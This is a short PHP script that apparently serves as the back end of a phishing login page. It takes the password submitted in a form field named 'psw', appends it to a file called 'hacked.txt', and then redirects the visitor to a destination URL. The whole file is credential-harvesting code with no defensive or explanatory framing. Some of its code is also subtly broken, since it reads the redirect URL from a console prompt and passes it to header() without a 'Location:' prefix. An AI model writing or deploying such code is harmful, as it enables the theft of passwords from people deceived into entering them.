<?php
$Location = readline('Enter the Destination URL: '); 
file_put_contents("hacked.txt", " [password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
header($Location);
?>
